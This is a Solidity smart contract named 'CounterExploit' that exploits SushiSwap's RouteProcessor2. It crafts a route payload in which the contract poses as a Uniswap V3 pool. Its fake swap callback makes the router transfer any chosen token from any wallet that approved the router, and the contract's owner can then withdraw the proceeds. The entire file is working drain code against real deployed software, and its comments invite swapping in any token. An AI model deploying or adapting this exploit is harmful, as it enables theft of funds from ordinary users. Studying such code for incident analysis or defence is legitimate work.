// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.13;

/// ============ Imports ============

import {IERC20} from "./interfaces/IERC20.sol"; // ERC20 minified interface
import {RouteProcessor2} from "./interfaces/RouteProcessor2.sol"; // RouteProcessor 2

/// @title CounterExploit
/// @notice Exploits SushiSwap RouteProcessor2
/// @author Anish Agnihotri <contact@anishagnihotri.com>
contract CounterExploit {
    /// ============ Immutable storage ============

    /// @notice Contract owner
    address internal immutable owner;
    /// @notice RouteProcessor2 contract
    RouteProcessor2 internal immutable RP;
    /// @notice Exploit payload
    bytes payload = abi.encodePacked(
        uint8(1), // Command code
        0x514910771AF9Ca656af840dff83E8264EcF986CA, // token (can replace w/ any)
        uint8(1), // Num
        uint16(0), // Share
        uint8(1), // poolType
        address(this), // Pool reentrancy
        false, // zeroForOne
        0x0000000000000000000000000000000000000000 // Recipient
    );

    /// ============ Mutable storage ============

    // Swap params (exploited asset)
    int256 internal tokenIn;
    address internal tokenInAddress;
    address internal tokenInFrom;

    /// ============ Constructor ============

    /// @notice Creates a new CounterExploit contract
    /// @param routeProcessor address
    constructor(address routeProcessor) {
        owner = msg.sender;
        RP = RouteProcessor2(routeProcessor);
    }

    /// @notice Executes exploit for some token
    /// @param tokenAmount to drain
    /// @param tokenAddress of ERC20 to drain
    /// @param exploitedSpender to drain from
    function exploit(int256 tokenAmount, address tokenAddress, address exploitedSpender) external {
        // Quick owner check
        require(msg.sender == owner, "Not owner");

        // Update local storage for callback
        // Not most effecient way, but functional
        tokenIn = tokenAmount;
        tokenInAddress = tokenAddress;
        tokenInFrom = exploitedSpender;

        // Call route execution
        RP.processRoute(
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0,
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0,
            0x0000000000000000000000000000000000000000,
            payload
        );
    }

    /// @notice UniswapV3Pool swap callback
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        RP.uniswapV3SwapCallback(tokenIn, 0, abi.encode(tokenInAddress, tokenInFrom));
        return (tokenIn, 0);
    }

    /// @notice Allows contract owner to approve spending ERC20 balance
    /// @param token address to update
    /// @param amount allowance to update
    function approve(address token, uint256 amount) external {
        // Quick owner check
        require(msg.sender == owner, "Not owner");
        IERC20(token).approve(msg.sender, amount);
    }
}
